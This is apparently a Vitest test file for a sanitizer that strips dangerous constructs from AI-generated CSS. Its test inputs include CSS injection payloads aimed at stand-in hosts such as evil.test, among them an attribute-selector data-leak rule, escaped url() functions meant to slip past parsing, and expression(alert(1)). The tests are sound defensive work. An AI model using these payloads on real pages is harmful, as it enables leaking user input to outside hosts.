import { describe, expect, it } from "vitest";
import { decodeEscapes, extractCss, sanitizeCss } from "@/lib/ai/sanitize";

describe("extractCss", () => {
  it("takes the css fence out of a chatty reply", () => {
    expect(extractCss("Sure!\n```css\nbody { color: red; }\n```\nEnjoy")).toBe("body { color: red; }\n");
  });

  it("handles an unterminated fence while streaming", () => {
    expect(extractCss("```css\nbody { color: red")).toBe("body { color: red\n");
  });

  it("picks the longest of several fences", () => {
    const text = "```css\na{}\n```\nand\n```css\nbody { color: red; }\n```";
    expect(extractCss(text)).toBe("body { color: red; }\n");
  });

  it("accepts unfenced CSS", () => {
    expect(extractCss("body { color: red; }")).toBe("body { color: red; }\n");
  });
});

describe("decodeEscapes", () => {
  it("decodes hex and literal escapes", () => {
    expect(decodeEscapes("u\\72l")).toBe("url");
    expect(decodeEscapes("\\75 rl")).toBe("url");
    expect(decodeEscapes("\\@import")).toBe("@import");
  });
});

describe("sanitizeCss", () => {
  const clean = (css: string) => sanitizeCss(css).css;

  it("leaves safe CSS, comments and formatting untouched", () => {
    const css = "/* Amber */\n:root {\n  --bg: #111;\n}\n\nbody {\n  color: #eee !important;\n}\n";
    expect(sanitizeCss(css)).toEqual({ css, warnings: [] });
  });

  it("removes @import rules, including escaped ones", () => {
    expect(clean('@import url("https://x.test/a.css");\nbody{color:red}')).not.toMatch(/import|x\.test/);
    expect(clean('@\\69mport "https://x.test/a.css";\nbody{color:red}')).not.toMatch(/x\.test/);
  });

  it("removes declarations with external url() but keeps the rest of the rule", () => {
    const out = clean("input[value^=a] { color: red; background: url(https://evil.test/a); }");
    expect(out).not.toContain("evil.test");
    expect(out).toContain("color: red");
  });

  it("removes protocol-relative and relative urls", () => {
    expect(clean("a{background:url(//evil.test/x)}")).not.toContain("evil.test");
    expect(clean("a{background:url(img/a.png)}")).not.toContain("a.png");
  });

  it("keeps data: and fragment urls", () => {
    const css = "a{background:url('data:image/png;base64,AAAA')} b{filter:url(#f)}";
    expect(clean(css)).toBe(css);
  });

  it("catches escaped url functions that css-tree can't parse", () => {
    expect(clean("a{background:u\\72l(https://evil.test/1)}")).not.toContain("evil.test");
    expect(clean("a{background:\\75rl(https://evil.test/2)}")).not.toContain("evil.test");
  });

  it("removes external strings in image-set() and src()", () => {
    expect(clean('a{background:image-set("https://evil.test/1.png" 1x)}')).not.toContain("evil.test");
    expect(clean('a{background:-webkit-image-set("https://evil.test/1.png" 1x)}')).not.toContain("evil.test");
    expect(clean('a{background-image:src("https://evil.test/1.png")}')).not.toContain("evil.test");
  });

  it("keeps harmless strings in functions like format() and local()", () => {
    const css = '@font-face{font-family:X;src:local("Arial")}';
    expect(clean(css)).toBe(css);
  });

  it("removes urls hidden in custom properties and nested at-rules", () => {
    expect(clean("a{--bg:url(https://evil.test/v)}")).not.toContain("evil.test");
    expect(clean("@media (min-width:1px){a{background:url(https://evil.test/m)}}")).not.toContain("evil.test");
    expect(clean("@supports (display:grid){@media screen{a{b:url(https://evil.test/n)}}}")).not.toContain("evil.test");
  });

  it("removes script-capable properties and expression()", () => {
    expect(clean("a{-moz-binding:url(x.xml#b)}")).not.toContain("binding");
    expect(clean("a{behavior:url(x.htc)}")).not.toContain("behavior");
    expect(clean("a{width:expression(alert(1))}")).not.toContain("expression");
  });

  it("removes unparseable junk that hides a url", () => {
    expect(clean("a{color:red; ??? background: url(  https://evil.test/5 ) }")).not.toContain("evil.test");
  });

  it("reports what it removed", () => {
    const { warnings } = sanitizeCss('@import "x.css"; a{background:url(https://e.test/x)}');
    expect(warnings).toContain("Removed @import rules.");
    expect(warnings).toContain("Removed external url() references.");
  });
});
